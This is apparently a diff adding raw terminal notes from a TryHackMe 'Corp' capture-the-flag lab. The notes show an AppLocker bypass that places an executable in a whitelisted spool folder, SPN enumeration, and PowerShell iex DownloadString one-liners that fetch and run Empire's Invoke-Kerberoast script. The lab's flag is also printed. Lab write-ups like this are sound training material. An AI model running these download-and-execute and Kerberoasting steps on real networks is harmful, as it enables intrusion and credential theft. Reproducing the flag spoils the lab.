@@ -1,0 +1,139 @@
+# https://tryhackme.com/room/corp
+
+
+┌──────────────────────────────────────────────────────────────┐
+│   ______                          ____          _         __ │
+│  / ____/_____ ___   ___   ____   / __ \ ____   (_)____   / /_│
+│ / / __ / ___// _ \ / _ \ / __ \ / /_/ // __ \ / // __ \ / __/│
+│/ /_/ // /   /  __//  __// / / // ____// /_/ // // / / // /_  │
+│\____//_/    \___/ \___//_/ /_//_/     \____//_//_/ /_/ \__/  │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
+┌──(kali㉿kali)-[~]
+└─$ Documents/TryHackMe/Corp              
+                                                                                                                                                                                                                     
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Corp]
+└─$ nano hw.c
+                                                                                                                 
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Corp]
+└─$ x86_64-w64-mingw32-gcc hw.c -o hw.exe   
+                                                                                                                 
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Corp]
+└─$ python3 -m http.server               
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.76.143 - - [18/Dec/2021 16:19:32] "GET /hw.exe HTTP/1.1" 200 -
+
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\dark> Invoke-WebRequest -Uri 'http://10.6.121.137:8000/hw.exe' -OutFile 'C:\Windows\System32\spool\drivers\c
+olor\hw.exe'
+PS C:\Users\dark> C:\Windows\System32\spool\drivers\color\hw.exe
+Hello World!
+PS C:\Users\dark> C:\Users\dark\Desktop\hw.exe
+Program 'hw.exe' failed to run: This program is blocked by group policy. For more information, contact your system
+administratorAt line:1 char:1
++ C:\Users\dark\Desktop\hw.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ C:\Users\dark\Desktop\hw.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+
+PS C:\Users\dark> more C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+ls
+dir
+Get-Content test
+flag{a12a41b5f8111327690f836e9b302f0b}
+iex(new-object net.webclient).DownloadString('http://127.0.0.1/test.ps1')
+cls
+exit
+Invoke-WebRequest -Uri 'http://10.6.121.137:8000/hw.exe' -OutFile 'C:\Windows\System32\spool\drivers\color\hw.exe'
+C:\Windows\System32\spool\drivers\color\hw.exe
+C:\Users\dark\Desktop\hw.exe
+more C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+> flag{a12a41b5f8111327690f836e9b302f0b}
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\dark> setspn -T medin -Q */*
+Ldap Error(0x51 -- Server Down): ldap_connect
+Failed to retrieve DN for domain "medin" : 0x00000051
+Warning: No valid targets specified, reverting to current domain.
+CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
+        ldap/omega.corp.local/ForestDnsZones.corp.local
+        ldap/omega.corp.local/DomainDnsZones.corp.local
+        TERMSRV/OMEGA
+        TERMSRV/omega.corp.local
+        DNS/omega.corp.local
+        GC/omega.corp.local/corp.local
+        RestrictedKrbHost/omega.corp.local
+        RestrictedKrbHost/OMEGA
+        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
+        HOST/OMEGA/CORP
+        HOST/omega.corp.local/CORP
+        HOST/OMEGA
+        HOST/omega.corp.local
+        HOST/omega.corp.local/corp.local
+        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
+        ldap/OMEGA/CORP
+        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
+        ldap/omega.corp.local/CORP
+        ldap/OMEGA
+        ldap/omega.corp.local
+        ldap/omega.corp.local/corp.local
+CN=krbtgt,CN=Users,DC=corp,DC=local
+        kadmin/changepw
+CN=fela,CN=Users,DC=corp,DC=local
+        HTTP/fela
+        HOST/fela@corp.local
+        HTTP/fela@corp.local
+
+Existing SPN found!
+
+
+> fela
+
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\dark> iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
+
+
+┌──────────────────────────────────────────────────────────────┐
+│   ______                          ____          _         __ │
+│  / ____/_____ ___   ___   ____   / __ \ ____   (_)____   / /_│
+│ / / __ / ___// _ \ / _ \ / __ \ / /_/ // __ \ / // __ \ / __/│
+│/ /_/ // /   /  __//  __// / / // ____// /_/ // // / / // /_  │
+│\____//_/    \___/ \___//_/ /_//_/     \____//_//_/ /_/ \__/  │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
+┌──(kali㉿kali)-[~]
+└─$ sudo -i                 
+[sudo] password for kali: 
+┌──(root💀kali)-[~]
+└─# /opt && git clone https://github.com/EmpireProject/Empire.git
+Cloning into 'Empire'...
+remote: Enumerating objects: 12216, done.
+remote: Total 12216 (delta 0), reused 0 (delta 0), pack-reused 12216
+Receiving objects: 100% (12216/12216), 22.14 MiB | 4.10 MiB/s, done.
+Resolving deltas: 100% (8307/8307), done.
+                                                                                                                 
+┌──(root💀kali)-[/opt]
+└─# x
+                                                                                                                 
+┌──(kali㉿kali)-[~]
+└─$ /opt/Empire/data/module_source/credentials 
+                                                                                                                 
+┌──(kali㉿kali)-[/opt/Empire/data/module_source/credentials]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.76.143 - - [18/Dec/2021 16:41:35] "GET /Invoke-Kerberoast.ps1 HTTP/1.1" 200 -
+
+
